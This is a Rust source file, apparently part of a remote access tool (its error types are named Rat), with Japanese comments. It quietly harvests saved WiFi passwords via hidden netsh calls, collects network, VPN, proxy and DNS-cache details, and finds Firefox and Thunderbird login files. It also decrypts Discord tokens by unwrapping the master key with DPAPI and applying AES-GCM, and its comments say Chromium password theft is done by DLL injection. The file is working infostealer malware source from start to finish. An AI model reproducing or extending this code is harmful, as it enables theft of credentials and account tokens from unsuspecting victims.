    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut legacy_data = Vec::new();
    let mut wifi_profiles = Vec::new();
    legacy_data.push("=== WiFi プロファイル情報 ===".to_string());
    
    // プロファイル一覧取得
    let output = Command::new("cmd")
        .args(["/C", "chcp 65001 >nul 2>&1 && netsh wlan show profiles"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| CollectError::Io(e))?;
    
    if !output.status.success() {
        return Err(CollectError::CommandFailed("netsh wlan show profiles failed".to_string()));
    }
    
    let profiles_text = decode_windows_output_enhanced(&output.stdout);
    let profile_names = parse_wifi_profile_names(&profiles_text);
    
    legacy_data.push(format!("発見されたWiFiプロファイル数: {}", profile_names.len()));
    
    // 各プロファイルの詳細情報取得
    for profile_name in profile_names {
        if let Ok(profile_detail) = get_wifi_profile_detail(&profile_name) {
            legacy_data.extend(profile_detail.legacy_info);
            if let Some(structured) = profile_detail.structured_profile {
                wifi_profiles.push(structured);
            }
        }
    }
    
    Ok((legacy_data, wifi_profiles))
}

#[cfg(windows)]
fn collect_structured_network_interfaces() -> Result<Vec<AuthNetworkInterface>, CollectError> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let output = Command::new("cmd")
        .args(["/C", "chcp 65001 >nul 2>&1 && ipconfig /all"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| CollectError::Io(e))?;
    
    if !output.status.success() {
        return Err(CollectError::CommandFailed("ipconfig /all failed".to_string()));
    }
    
    let ipconfig_text = decode_windows_output_enhanced(&output.stdout);
    let interfaces = parse_ipconfig_interfaces(&ipconfig_text);
    
    Ok(interfaces)
}

struct WifiProfileDetail {
    legacy_info: Vec<String>,
    structured_profile: Option<WifiProfile>,
}

#[cfg(windows)]
fn get_wifi_profile_detail(profile_name: &str) -> Result<WifiProfileDetail, CollectError> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut legacy_info = Vec::new();
    let mut structured_profile = None;
    
    // プロファイル詳細取得
    let detail_output = Command::new("cmd")
        .args(["/C", &format!("chcp 65001 >nul 2>&1 && netsh wlan show profile name=\"{}\" key=clear", profile_name)])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| CollectError::Io(e))?;
    
    if detail_output.status.success() {
        let detail_text = decode_windows_output_enhanced(&detail_output.stdout);
        legacy_info.extend(detail_text.lines().map(|s| s.to_string()).take(20));
        
        // 構造化データの抽出
        let mut wifi_profile = WifiProfile {
            ssid: profile_name.to_string(),
            key: None,
            interface: None,
            auth_type: None,
        };
        
        // キーマテリアルの抽出
        for line in detail_text.lines() {
            if contains_any(line, ["Key Content", "キー コンテンツ"]) && line.contains(':') {
                if let Some(key) = line.split(':').nth(1) {
                    let key_value = trim_all(key);
                    if !key_value.is_empty() && key_value != "Not Present" && !key_value.contains("存在しません") {
                        wifi_profile.key = Some(key_value);
                    }
                }
            }
            if contains_any(line, ["Authentication", "認証"]) && line.contains(':') {
                if let Some(auth) = line.split(':').nth(1) {
                    wifi_profile.auth_type = Some(trim_all(auth));
                }
            }
        }
        
        structured_profile = Some(wifi_profile);
    }
    
    Ok(WifiProfileDetail {
        legacy_info,
        structured_profile,
    })
}

#[cfg(windows)]
fn parse_wifi_profile_names(text: &str) -> Vec<String> {
    let mut profiles = Vec::new();
    
    for line in text.lines() {
        if contains_any(line, ["All User Profile", "すべてのユーザー プロファイル"]) && line.contains(':') {
            if let Some(profile_name) = line.split(':').nth(1) {
                let name = trim_all(profile_name);
                if !name.is_empty() {
                    profiles.push(name);
                }
            }
        }
    }
    
    profiles
}

#[cfg(windows)]
fn parse_ipconfig_interfaces(text: &str) -> Vec<AuthNetworkInterface> {
    let mut interfaces = Vec::new();
    let mut current_interface: Option<AuthNetworkInterface> = None;
    
    for line in text.lines() {
        let line = line.trim_end();
        if line.is_empty() { continue; }
        
        // アダプター名の検出
        if line.ends_with(':') && contains_any(line, ["adapter", "アダプター", "Ethernet", "Wi-Fi", "ワイヤレス"]) {
            if let Some(interface) = current_interface.take() {
                interfaces.push(interface);
            }
            
            current_interface = Some(AuthNetworkInterface {
                name: line.trim_end_matches(':').to_string(),
                mac: None,
                ipv4: Vec::new(),
                ipv6: Vec::new(),
                gateway: Vec::new(),
                dns: Vec::new(),
            });
            continue;
        }
        
        if let Some(ref mut interface) = current_interface {
            let line_trimmed = line.trim();
            
            // MAC アドレス
            if contains_any(line_trimmed, ["Physical Address", "物理アドレス"]) && line_trimmed.contains(':') {
                if let Some(mac) = line_trimmed.split(':').nth(1) {
                    interface.mac = Some(trim_all(mac));
                }
            }
            
            // IPv4 アドレス
            if contains_any(line_trimmed, ["IPv4 Address", "IPv4 アドレス"]) && line_trimmed.contains(':') {
                if let Some(ip) = line_trimmed.split(':').nth(1) {
                    let ip_clean = trim_all(ip).trim_end_matches("(Preferred)").trim().to_string();
                    if !ip_clean.is_empty() {
                        interface.ipv4.push(ip_clean);
                    }
                }
            }
            
            // IPv6 アドレス
            if contains_any(line_trimmed, ["IPv6 Address", "IPv6 アドレス"]) && line_trimmed.contains(':') {
                if let Some(ip) = line_trimmed.split(':').nth(1) {
                    let ip_clean = trim_all(ip).trim_end_matches("(Preferred)").trim().to_string();
                    if !ip_clean.is_empty() {
                        interface.ipv6.push(ip_clean);
                    }
                }
            }
            
            // デフォルトゲートウェイ
            if contains_any(line_trimmed, ["Default Gateway", "既定のゲートウェイ"]) && line_trimmed.contains(':') {
                if let Some(gw) = line_trimmed.split(':').nth(1) {
                    let gw_clean = trim_all(gw);
                    if !gw_clean.is_empty() {
                        interface.gateway.push(gw_clean);
                    }
                }
            }
            
            // DNS サーバー
            if starts_with_any(line_trimmed, ["DNS Servers", "DNS サーバー"]) && line_trimmed.contains(':') {
                if let Some(dns) = line_trimmed.split(':').nth(1) {
                    let dns_clean = trim_all(dns);
                    if !dns_clean.is_empty() {
                        interface.dns.push(dns_clean);
                    }
                }
            }
        }
    }
    
    // 最後のインターフェースを追加
    if let Some(interface) = current_interface {
        interfaces.push(interface);
    }
    
    interfaces
}

// 未使用関数を削除済み - collect_browser_passwords() は auth_collector::collect_auth_data() で直接実装

// Chromiumパスワード収集はDLL注入で実装されています

// Discord トークン収集
fn collect_discord_tokens() -> RatResult<Vec<String>> {
    #[cfg(windows)]
    {
        extract_discord_tokens_windows()
    }
    #[cfg(not(windows))]
    {
        Ok(vec!["Discord token extraction only supported on Windows".to_string()])
    }
}

// 古い関数は削除済み - decode_windows_output_enhanced を使用

// 未使用関数を削除済み - collect_wifi_credentials(), collect_wifi_profiles() 
// ネットワーク情報は collect_detailed_system_info() で収集済み

// WiFiプロファイル収集は collect_detailed_system_info() 内で実装済み

/// VPN接続情報収集
#[cfg(windows)]
fn collect_vpn_connections() -> Vec<String> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut vpn_data = Vec::new();
    vpn_data.push("\n=== VPN接続情報 ===".to_string());
    
    // RAS接続情報
    if let Ok(output) = Command::new("rasdial")
        .creation_flags(0x08000000)
        .output()
    {
        let ras_text = decode_windows_output_enhanced(&output.stdout);
        vpn_data.extend(ras_text.lines().map(|s| format!("RAS: {}", s)));
    }
    
    // PowerShell VPN情報
    if let Ok(output) = Command::new("powershell")
        .args(["-Command", "Get-VpnConnection | Select-Object Name,ServerAddress,TunnelType,AuthenticationMethod | ConvertTo-Json"])
        .creation_flags(0x08000000)
        .output()
    {
        let vpn_text = String::from_utf8_lossy(&output.stdout);
        if !vpn_text.trim().is_empty() {
            vpn_data.push("VPN設定 (JSON):".to_string());
            vpn_data.extend(vpn_text.lines().map(|s| s.to_string()));
        }
    }
    
    vpn_data
}

/// イーサネット接続情報収集
#[cfg(windows)]
fn collect_ethernet_info() -> Vec<String> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut eth_data = Vec::new();
    eth_data.push("\n=== イーサネット接続情報 ===".to_string());
    
    // IPConfig詳細情報
    if let Ok(output) = Command::new("ipconfig")
        .args(["/all"])
        .creation_flags(0x08000000)
        .output()
    {
        let ip_text = String::from_utf8_lossy(&output.stdout);
        eth_data.extend(ip_text.lines().take(50).map(|s| s.to_string())); // 最初の50行のみ
    }
    
    // ネットワーク統計
    if let Ok(output) = Command::new("netstat")
        .args(["-r"])
        .creation_flags(0x08000000)
        .output()
    {
        eth_data.push("\n--- ルーティングテーブル ---".to_string());
        let netstat_text = String::from_utf8_lossy(&output.stdout);
        eth_data.extend(netstat_text.lines().take(20).map(|s| s.to_string()));
    }
    
    eth_data
}

/// Bluetooth接続デバイス情報収集
#[cfg(windows)]
fn collect_bluetooth_devices() -> Vec<String> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut bt_data = Vec::new();
    bt_data.push("\n=== Bluetooth接続デバイス ===".to_string());
    
    // PowerShellでBluetooth情報取得
    if let Ok(output) = Command::new("powershell")
        .args(["-Command", "Get-PnpDevice | Where-Object {$_.Class -eq 'Bluetooth'} | Select-Object FriendlyName,Status,InstanceId | ConvertTo-Json"])
        .creation_flags(0x08000000)
        .output()
    {
        let bt_text = String::from_utf8_lossy(&output.stdout);
        if !bt_text.trim().is_empty() {
            bt_data.extend(bt_text.lines().map(|s| s.to_string()));
        }
    }
    
    bt_data
}

/// ネットワークアダプター情報収集
#[cfg(windows)]
fn collect_network_adapters() -> Vec<String> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut adapter_data = Vec::new();
    adapter_data.push("\n=== ネットワークアダプター情報 ===".to_string());
    
    // WMI経由でアダプター情報取得
    if let Ok(output) = Command::new("wmic")
        .args(["path", "win32_networkadapter", "get", "name,adaptertype,macaddress,netconnectionstatus", "/format:list"])
        .creation_flags(0x08000000)
        .output()
    {
        let adapter_text = String::from_utf8_lossy(&output.stdout);
        adapter_data.extend(
            adapter_text
                .lines()
                .filter(|line| !line.trim().is_empty())
                .map(|s| s.to_string())
        );
    }
    
    adapter_data
}

/// プロキシ設定情報収集
#[cfg(windows)]
fn collect_proxy_settings() -> Vec<String> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut proxy_data = Vec::new();
    proxy_data.push("\n=== プロキシ設定情報 ===".to_string());
    
    // netsh winhttp プロキシ設定
    if let Ok(output) = Command::new("netsh")
        .args(["winhttp", "show", "proxy"])
        .creation_flags(0x08000000)
        .output()
    {
        let proxy_text = String::from_utf8_lossy(&output.stdout);
        proxy_data.extend(proxy_text.lines().map(|s| s.to_string()));
    }
    
    // レジストリからInternet Explorer設定
    if let Ok(output) = Command::new("reg")
        .args(["query", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "/v", "ProxyServer"])
        .creation_flags(0x08000000)
        .output()
    {
        let reg_text = String::from_utf8_lossy(&output.stdout);
        if !reg_text.contains("ERROR") {
            proxy_data.push("IE プロキシ設定:".to_string());
            proxy_data.extend(reg_text.lines().map(|s| s.to_string()));
        }
    }
    
    proxy_data
}

/// ネットワーク共有情報収集
#[cfg(windows)]
fn collect_network_shares() -> Vec<String> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut share_data = Vec::new();
    share_data.push("\n=== ネットワーク共有情報 ===".to_string());
    
    // 共有フォルダー一覧
    if let Ok(output) = Command::new("net")
        .args(["share"])
        .creation_flags(0x08000000)
        .output()
    {
        let share_text = String::from_utf8_lossy(&output.stdout);
        share_data.extend(share_text.lines().map(|s| s.to_string()));
    }
    
    // マップされたドライブ
    if let Ok(output) = Command::new("net")
        .args(["use"])
        .creation_flags(0x08000000)
        .output()
    {
        share_data.push("\n--- マップされたドライブ ---".to_string());
        let use_text = String::from_utf8_lossy(&output.stdout);
        share_data.extend(use_text.lines().map(|s| s.to_string()));
    }
    
    share_data
}

/// DNSキャッシュ情報収集
#[cfg(windows)]
fn collect_dns_cache() -> Vec<String> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut dns_data = Vec::new();
    dns_data.push("\n=== DNSキャッシュ情報 ===".to_string());
    
    // DNS解決キャッシュ
    if let Ok(output) = Command::new("ipconfig")
        .args(["/displaydns"])
        .creation_flags(0x08000000)
        .output()
    {
        let dns_text = String::from_utf8_lossy(&output.stdout);
        // キャッシュ情報は大量なので最初の100行に制限
        dns_data.extend(
            dns_text
                .lines()
                .take(100)
                .filter(|line| !line.trim().is_empty())
                .map(|s| s.to_string())
        );
    }
    
    dns_data
}

/// Unix系システム向けネットワーク情報収集
#[cfg(not(windows))]
fn collect_unix_network_info() -> Vec<String> {
    use std::process::Command;
    
    let mut network_data = Vec::new();
    network_data.push("=== Unix系ネットワーク情報 ===".to_string());
    
    // WiFi情報 (iwconfig/nmcli)
    if let Ok(output) = Command::new("nmcli")
        .args(["connection", "show"])
        .output()
    {
        network_data.push("\n--- NetworkManager接続 ---".to_string());
        let nmcli_text = String::from_utf8_lossy(&output.stdout);
        network_data.extend(nmcli_text.lines().map(|s| s.to_string()));
    }
    
    // インターフェース情報
    if let Ok(output) = Command::new("ip")
        .args(["addr", "show"])
        .output()
    {
        network_data.push("\n--- ネットワークインターフェース ---".to_string());
        let ip_text = String::from_utf8_lossy(&output.stdout);
        network_data.extend(ip_text.lines().map(|s| s.to_string()));
    }
    
    // ルーティング情報
    if let Ok(output) = Command::new("ip")
        .args(["route", "show"])
        .output()
    {
        network_data.push("\n--- ルーティングテーブル ---".to_string());
        let route_text = String::from_utf8_lossy(&output.stdout);
        network_data.extend(route_text.lines().map(|s| s.to_string()));
    }
    
    network_data
}

// ヘルパー関数

#[cfg(feature = "browser")]
fn get_firefox_profiles() -> RatResult<Vec<std::path::PathBuf>> {
    let mut profiles = Vec::new();
    
    if let Some(appdata) = std::env::var_os("APPDATA") {
        let appdata_path = std::path::PathBuf::from(appdata);
        
        // Firefox プロファイル
        let firefox_dir = appdata_path.join("Mozilla").join("Firefox").join("Profiles");
        profiles.extend(scan_firefox_directory(&firefox_dir));
        
        // Thunderbird プロファイル
        let thunderbird_dir = appdata_path.join("Thunderbird").join("Profiles");
        profiles.extend(scan_firefox_directory(&thunderbird_dir));
        

    }
    
    Ok(profiles)
}

#[cfg(feature = "browser")]
fn scan_firefox_directory(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
    let mut profiles = Vec::new();
    
    if dir.exists() {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                if entry.file_type().map_or(false, |ft| ft.is_dir()) {
                    let profile_path = entry.path();
                    if profile_path.join("logins.json").exists() {
                        profiles.push(profile_path);
                    }
                }
            }
        }
    }
    
    profiles
}

// Chromiumプロファイル検出はDLL注入で実装されています

#[cfg(feature = "browser")]
fn detect_firefox_browser_type(profile_path: &std::path::Path) -> &'static str {
    let path_str = profile_path.to_string_lossy();
    if path_str.contains("Thunderbird") {
        "Thunderbird"
    } else if path_str.contains("Firefox Developer Edition") {
        "Firefox Developer Edition"
    } else if path_str.contains("Firefox Nightly") {
        "Firefox Nightly"
    } else {
        "Firefox"
    }
}

// Chromiumパスワード抽出はDLL注入で実装されています

// Chromiumパスワード復号化はDLL注入で実装されています

#[cfg(windows)]
fn extract_discord_tokens_windows() -> RatResult<Vec<String>> {
    let mut tokens = Vec::new();
    let mut successful_extractions = 0;
    
    // 1. 高度な復号化を試行
    if let Ok(decrypted_tokens) = extract_discord_with_decryption() {
        tokens.extend(decrypted_tokens);
        successful_extractions = tokens.len();
    }
    
    // 2. フォールバック: 手動パターンマッチング
    if successful_extractions == 0 {
        if let Ok(pattern_tokens) = extract_discord_with_patterns() {
            tokens.extend(pattern_tokens);
            successful_extractions = tokens.len();
        }
    }
    
    // 結果の整理
    if successful_extractions > 0 {
        tokens.push(format!("✅ Discord: {} tokens extracted", successful_extractions));
    } else {
        tokens.push("Discord: No valid tokens found".to_string());
    }
    
    Ok(tokens)
}

// 高度なDiscordトークン抽出（DPAPI + AES復号化）
#[cfg(windows)]
fn extract_discord_with_decryption() -> RatResult<Vec<String>> {
    let discord_dir = find_discord_directory()?;
    let master_key = get_discord_master_key(&discord_dir.join("Local State"))?;
    let ldb_files = find_all_discord_ldb_files(&discord_dir)?;
    
    let mut tokens = Vec::new();
    
    for ldb_path in ldb_files {
        if let Ok(ldb_data) = std::fs::read(&ldb_path) {
            let ldb_content = String::from_utf8_lossy(&ldb_data);
            let encrypted_tokens = extract_discord_encrypted_tokens(&ldb_content);
            
            for encrypted_token in encrypted_tokens {
                if let Ok(decrypted) = decrypt_discord_token(&master_key, &encrypted_token) {
                    tokens.push(format!("Discord Token: {}", decrypted));
                }
            }
        }
    }
    
    if tokens.is_empty() { 
        Err(RatError::Config("No decrypted tokens found".to_string()))
    } else { 
        Ok(tokens) 
    }
}

// フォールバック: 手動パターンマッチング
#[cfg(windows)]
fn extract_discord_with_patterns() -> RatResult<Vec<String>> {
    let discord_path = get_config_dir()?.join("discord");
    if !discord_path.exists() {
        return Err(RatError::Config("Discord directory not found".to_string()));
    }
    
    let mut tokens = Vec::new();
    let leveldb_path = discord_path.join("Local Storage").join("leveldb");
    
    if let Ok(entries) = std::fs::read_dir(&leveldb_path) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().map_or(false, |ext| ext == "ldb") {
                if let Ok(content) = std::fs::read(&path) {
                    let content_str = String::from_utf8_lossy(&content);
                    
                    // 統合されたトークン検索
                    for token_fn in [find_mfa_token, find_normal_token, find_json_token] {
                        if let Some(token) = token_fn(&content_str) {
                            tokens.push(format!("Discord Token: {}", token));
                        }
                    }
                }
            }
        }
    }
    
    // 追加のディレクトリもチェック
    tokens.extend(search_tokens_in_directory(&discord_path.join("Session Storage")).unwrap_or_default());
    
    if tokens.is_empty() { 
        Err(RatError::Config("No pattern tokens found".to_string()))
    } else { 
        Ok(tokens) 
    }
}

fn search_tokens_in_directory(dir_path: &std::path::Path) -> RatResult<Vec<String>> {
    let mut tokens = Vec::new();
    
    if let Ok(entries) = std::fs::read_dir(dir_path) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                if let Ok(content) = std::fs::read_to_string(&path) {
                    // JSON形式のトークンを検索
                    if content.contains("token") {
                        
                        // 手動でDiscordトークンを検索
                        if let Some(token) = find_json_token(&content) {
                            tokens.push(format!("Discord Token (JSON): {}", token));
                        }
                        
                        if let Some(token) = find_mfa_token(&content) {
                            tokens.push(format!("Discord Token (MFA): {}", token));
                        }
                        
                        if let Some(token) = find_normal_token(&content) {
                            tokens.push(format!("Discord Token (Normal): {}", token));
                        }
                    }
                }
            }
        }
    }
    
    Ok(tokens)
}

fn find_mfa_token(content: &str) -> Option<String> {
    let mut i = 0;
    let chars: Vec<char> = content.chars().collect();
    
    while i < chars.len() - 4 {
        if chars[i] == 'm' && chars[i+1] == 'f' && chars[i+2] == 'a' && chars[i+3] == '.' {
            let start = i;
            let mut j = i + 4;
            
            // MFAトークンは約88文字
            while j < chars.len() && j < start + 100 {
                let c = chars[j];
                if !c.is_alphanumeric() && c != '_' && c != '-' {
                    break;
                }
                j += 1;
            }
            
            if j - start >= 88 {
                let token: String = chars[start..j].iter().collect();
                return Some(token);
            }
        }
        i += 1;
    }
    None
}

fn find_normal_token(content: &str) -> Option<String> {
    let mut i = 0;
    let chars: Vec<char> = content.chars().collect();
    
    while i < chars.len() - 50 {
        // 24文字の数字・文字で始まる部分を探す
        if chars[i].is_alphanumeric() {
            let start = i;
            let mut dot_count = 0;
            let mut j = i;
            
            while j < chars.len() && j < start + 100 {
                let c = chars[j];
                if c == '.' {
                    dot_count += 1;
                    if dot_count > 2 { break; }
                } else if !c.is_alphanumeric() && c != '_' && c != '-' {
                    break;
                }
                j += 1;
            }
            
            if dot_count == 2 && j - start >= 50 {
                let token: String = chars[start..j].iter().collect();
                return Some(token);
            }
        }
        i += 1;
    }
    None
}

fn find_json_token(content: &str) -> Option<String> {
    if let Some(start) = content.find("\"token\":\"") {
        let token_start = start + 9; // "token":"の長さ
        if let Some(end) = content[token_start..].find('"') {
            let token = &content[token_start..token_start + end];
            return Some(token.to_string());
        }
    }
    None
}

// 使用しないため削除

fn get_config_dir() -> RatResult<std::path::PathBuf> {
    #[cfg(windows)]
    {
        use windows::Win32::System::Com::CoTaskMemFree;
        use windows::Win32::UI::Shell::{SHGetKnownFolderPath, FOLDERID_RoamingAppData, KF_FLAG_DEFAULT};

        // SHGetKnownFolderPath returns a CoTaskMem-allocated PWSTR; free with CoTaskMemFree
        let pw = unsafe { SHGetKnownFolderPath(&FOLDERID_RoamingAppData, KF_FLAG_DEFAULT, None) }
            .map_err(|e| RatError::Config(format!("Failed to get RoamingAppData: {}", e)))?;
        // Convert to String and free the memory
        let path_string = unsafe { pw.to_string() }.map_err(|_| RatError::Config("Invalid UTF-16 path".to_string()))?;
        unsafe { CoTaskMemFree(Some(pw.0 as _)); }
        Ok(std::path::PathBuf::from(path_string))
    }
    #[cfg(not(windows))]
    {
        std::env::var("HOME")
            .map(|home| std::path::PathBuf::from(home).join(".config"))
            .map_err(|_| RatError::Config("HOME not found".to_string()))
    }
}

#[cfg(not(feature = "browser"))]
fn collect_firefox_passwords() -> RatResult<Vec<String>> {
    Ok(vec!["Browser feature not enabled".to_string()])
}

// Chromium復号化機能はDLL注入で実装済み

// =====================================================
// 高度なDiscordトークン抽出機能
// =====================================================

use std::ffi::c_void;
use std::ptr;

// Windows DPAPI FFI定義
#[cfg(windows)]
#[link(name = "crypt32")]
extern "system" {
    fn CryptUnprotectData(
        pDataIn: *const DataBlob,
        ppszDataDescr: *mut *mut u16,
        pOptionalEntropy: *const DataBlob,
        pvReserved: *mut c_void,
        pPromptStruct: *mut c_void,
        dwFlags: u32,
        pDataOut: *mut DataBlob,
    ) -> i32;
}

#[cfg(windows)]
#[link(name = "kernel32")]
extern "system" {
    fn LocalFree(hMem: *mut c_void) -> *mut c_void;
}

#[cfg(windows)]
#[repr(C)]
struct DataBlob {
    cb_data: u32,
    pb_data: *mut u8,
}

#[cfg(windows)]
const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;

// Discordディレクトリを検出
fn find_discord_directory() -> RatResult<std::path::PathBuf> {
    let config_dir = get_config_dir()?;
    let discord_path = config_dir.join("discord");
    
    if !discord_path.exists() {
        return Err(RatError::Config(format!("Discord directory not found: {}", discord_path.display())));
    }
    
    Ok(discord_path)
}

// DPAPIでデータを復号化
#[cfg(windows)]
fn dpapi_unprotect(data: &[u8]) -> RatResult<Vec<u8>> {
    unsafe {
        let in_blob = DataBlob {
            cb_data: data.len() as u32,
            pb_data: data.as_ptr() as *mut u8,
        };
        let mut out_blob = DataBlob {
            cb_data: 0,
            pb_data: ptr::null_mut(),
        };
        
        let result = CryptUnprotectData(
            &in_blob,
            ptr::null_mut(),
            ptr::null(),
            ptr::null_mut(),
            ptr::null_mut(),
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut out_blob,
        );
        
        if result != 0 {
            let slice = std::slice::from_raw_parts(out_blob.pb_data, out_blob.cb_data as usize);
            let decrypted_data = slice.to_vec();
            LocalFree(out_blob.pb_data as *mut c_void);
            Ok(decrypted_data)
        } else {
            Err(RatError::Config("DPAPI decryption failed".to_string()))
        }
    }
}

#[cfg(not(windows))]
fn dpapi_unprotect(_data: &[u8]) -> RatResult<Vec<u8>> {
    Err(RatError::Config("DPAPI not available on non-Windows".to_string()))
}

// Local StateからDiscordのマスターキーを取得
fn get_discord_master_key(local_state_path: &std::path::Path) -> RatResult<Vec<u8>> {
    let json_content = std::fs::read_to_string(local_state_path)
        .map_err(|_| RatError::Config("Failed to read Local State".to_string()))?;
    
    let v: serde_json::Value = serde_json::from_str(&json_content)
        .map_err(|_| RatError::Config("Failed to parse Local State JSON".to_string()))?;
    
    let encrypted_key_b64 = v["os_crypt"]["encrypted_key"]
        .as_str()
        .ok_or_else(|| RatError::Config("Encrypted key not found in Local State".to_string()))?;
    
    let encrypted_key = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, encrypted_key_b64)
        .map_err(|_| RatError::Config("Failed to decode encrypted key".to_string()))?;
    
    if !encrypted_key.starts_with(b"DPAPI") {
        return Err(RatError::Config("Invalid key format (missing DPAPI prefix)".to_string()));
    }
    
    let master_key = dpapi_unprotect(&encrypted_key[5..])?;
    Ok(master_key)
}

// すべてのLDBファイルを検索
fn find_all_discord_ldb_files(discord_dir: &std::path::Path) -> RatResult<Vec<std::path::PathBuf>> {
    let leveldb_path = discord_dir.join("Local Storage").join("leveldb");
    if !leveldb_path.exists() {
        return Err(RatError::Config(format!("LevelDB directory not found: {}", leveldb_path.display())));
    }
    
    let mut ldb_files = Vec::new();
    collect_ldb_files_recursive(&leveldb_path, &mut ldb_files)?;
    
    if ldb_files.is_empty() {
        return Err(RatError::Config("No LDB files found".to_string()));
    }
    
    ldb_files.sort();
    Ok(ldb_files)
}

// 再帰的にLDBファイルを収集
fn collect_ldb_files_recursive(dir: &std::path::Path, ldb_files: &mut Vec<std::path::PathBuf>) -> RatResult<()> {
    let entries = std::fs::read_dir(dir)
        .map_err(|_| RatError::Config(format!("Failed to read directory: {}", dir.display())))?;
    
    for entry in entries {
        let entry = entry.map_err(|_| RatError::Config("Failed to read directory entry".to_string()))?;
        let path = entry.path();
        
        if path.is_dir() {
            collect_ldb_files_recursive(&path, ldb_files)?;
        } else if path.extension().map_or(false, |ext| ext == "ldb") {
            ldb_files.push(path);
        }
    }
    
    Ok(())
}

// LDBファイルから暗号化されたトークンを抽出
fn extract_discord_encrypted_tokens(ldb_content: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let pattern = "dQw4w9WgXcQ:";
    let mut start = 0;
    
    while let Some(pos) = ldb_content[start..].find(pattern) {
        let token_start = start + pos + pattern.len();
        let remaining = &ldb_content[token_start..];
        
        // トークンの終端を探す
        let token_end = remaining
            .find(|c: char| c == '"' || c == '\0' || c == '\n' || c == '\r' || c.is_control())
            .unwrap_or(remaining.len());
        
        if token_end > 20 {
            let token = &remaining[..token_end];
            // Base64形式かチェック
            if token.chars().all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=') {
                tokens.push(token.to_string());
            }
        }
        
        start = token_start + token_end;
    }
    
    tokens
}

// 暗号化されたトークンを復号化
fn decrypt_discord_token(master_key: &[u8], encrypted_b64: &str) -> RatResult<String> {
    use aes_gcm::{Aes256Gcm, Nonce, aead::{Aead, KeyInit}};
    
    let data = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, encrypted_b64)
        .map_err(|_| RatError::Config("Failed to decode encrypted token".to_string()))?;
    
    if data.len() < 15 + 16 {
        return Err(RatError::Config(format!("Invalid encrypted token length: {}", data.len())));
    }
    
    // v10プレフィックス(3バイト) + IV(12バイト) + 暗号化データ + タグ(16バイト)
    let iv = &data[3..15];
    let ciphertext = &data[15..data.len() - 16];
    let tag = &data[data.len() - 16..];
    
    let cipher = Aes256Gcm::new_from_slice(master_key)
        .map_err(|_| RatError::Config("Failed to create AES cipher".to_string()))?;
    
    let mut data_with_tag = ciphertext.to_vec();
    data_with_tag.extend_from_slice(tag);
    
    let nonce = Nonce::from_slice(iv);
    
    let plaintext = cipher.decrypt(nonce, data_with_tag.as_ref())
        .map_err(|_| RatError::Config("Failed to decrypt token".to_string()))?;
    
    Ok(String::from_utf8_lossy(&plaintext).to_string())
}
